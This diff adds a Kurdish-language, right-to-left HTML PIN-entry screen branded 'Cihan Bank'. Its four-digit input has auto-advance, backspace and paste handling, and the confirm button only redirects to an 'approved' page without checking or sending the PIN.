@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+  <title>Cihan Bank</title>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="shared.css">
+  <link rel="icon" href="favicon.png">
+  <style>
+    .pin-container {
+      text-align: center;
+      padding: 20px 0;
+    }
+
+    .pin-icon {
+      width: 64px; height: 64px;
+      background: rgba(177,24,17,0.08);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 20px;
+    }
+    .pin-icon svg {
+      width: 30px; height: 30px;
+      stroke: #b11811; fill: none;
+      stroke-width: 2; stroke-linecap: round; stroke-linejoin: round;
+    }
+
+    .pin-title {
+      font-size: 24px;
+      font-weight: 800;
+      color: #1a1a1a;
+      margin-bottom: 8px;
+    }
+
+    .pin-sub {
+      font-size: 15px;
+      color: #6b6b6b;
+      margin-bottom: 8px;
+    }
+
+    /* PIN inputs row - always LTR so digits go left to right */
+    .pin-row {
+      display: flex;
+      gap: 14px;
+      justify-content: center;
+      margin: 32px 0;
+      direction: ltr;
+    }
+
+    .pin-input {
+      width: 48px;
+      height: 56px;
+      text-align: center;
+      font-size: 26px;
+      font-weight: 800;
+      font-family: 'Tajawal', sans-serif;
+      border: 2px solid #e5e7eb;
+      border-radius: 16px;
+      background: #f8f8f8;
+      color: #1a1a1a;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+      -webkit-appearance: none;
+      -moz-appearance: textfield;
+    }
+
+    .pin-input::-webkit-inner-spin-button,
+    .pin-input::-webkit-outer-spin-button {
+      -webkit-appearance: none; margin: 0;
+    }
+
+    .pin-input:focus {
+      border-color: #b11811;
+      box-shadow: 0 0 0 3px rgba(177,24,17,0.12);
+      background: #fff;
+    }
+
+    .pin-input.filled {
+      border-color: #b11811;
+      background: #fff;
+    }
+
+    .pin-error {
+      color: #dc2626;
+      font-size: 14px;
+      min-height: 20px;
+      margin-bottom: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="bg-pattern"></div>
+  <div class="page-wrapper">
+    <div class="logo-container" style="padding-top:40px;">
+      <img src="assets/cb-logo.png" alt="Cihan Bank" class="logo-img">
+    </div>
+
+    <div class="bottom-sheet">
+      <div class="drag-handle"></div>
+
+      <div class="pin-container">
+        <!-- Icon -->
+        <div class="pin-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            <line x1="12" y1="16" x2="12" y2="19"></line>
+          </svg>
+        </div>
+
+        <h1 class="pin-title" id="pinTitle"></h1>
+        <p class="pin-sub" id="pinSub"></p>
+
+        <!-- PIN Inputs -->
+        <div class="pin-row" id="pinRow">
+          <input type="text" class="pin-input" inputmode="numeric" maxlength="1" data-idx="0" autofocus>
+          <input type="text" class="pin-input" inputmode="numeric" maxlength="1" data-idx="1">
+          <input type="text" class="pin-input" inputmode="numeric" maxlength="1" data-idx="2">
+          <input type="text" class="pin-input" inputmode="numeric" maxlength="1" data-idx="3">
+        </div>
+
+        <div class="pin-error" id="pinError"></div>
+
+        <button class="btn-primary" id="confirmBtn" onclick="confirmPin()" disabled></button>
+      </div>
+    </div>
+  </div>
+
+  <script src="shared.js"></script>
+  <script>
+    var pins = document.querySelectorAll('.pin-input');
+
+    function renderPage() {
+      applyLang();
+      document.getElementById('pinTitle').textContent   = t('pinTitle');
+      document.getElementById('pinSub').textContent     = t('pinSub');
+      document.getElementById('confirmBtn').textContent = t('confirm');
+    }
+
+    /* Auto-focus next input */
+    pins.forEach(function(input, idx) {
+      input.addEventListener('input', function(e) {
+        var val = this.value.replace(/\D/g, '');
+        this.value = val.substring(0, 1);
+
+        if (val && idx < 3) {
+          pins[idx + 1].focus();
+        }
+
+        this.classList.toggle('filled', !!this.value);
+        checkComplete();
+      });
+
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !this.value && idx > 0) {
+          pins[idx - 1].focus();
+          pins[idx - 1].value = '';
+          pins[idx - 1].classList.remove('filled');
+          checkComplete();
+        }
+      });
+
+      /* Handle paste */
+      input.addEventListener('paste', function(e) {
+        e.preventDefault();
+        var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+        if (!pasted) return;
+
+        for (var i = 0; i < 4 && i < pasted.length; i++) {
+          pins[i].value = pasted[i];
+          pins[i].classList.add('filled');
+        }
+
+        var focusIdx = Math.min(pasted.length, 3);
+        pins[focusIdx].focus();
+        checkComplete();
+      });
+    });
+
+    function checkComplete() {
+      var code = '';
+      pins.forEach(function(p) { code += p.value; });
+      document.getElementById('confirmBtn').disabled = code.length < 4;
+    }
+
+    function confirmPin() {
+      var code = '';
+      pins.forEach(function(p) { code += p.value; });
+
+      if (code.length < 4) return;
+
+      var btn = document.getElementById('confirmBtn');
+      btn.disabled = true;
+      btn.textContent = '...';
+
+      /* Navigate to approved page */
+      setTimeout(function() {
+        window.location.href = 'approved.html';
+      }, 800);
+    }
+
+    renderPage();
+    /* Focus first input on load */
+    pins[0].focus();
+  </script>
+</body>
+</html>
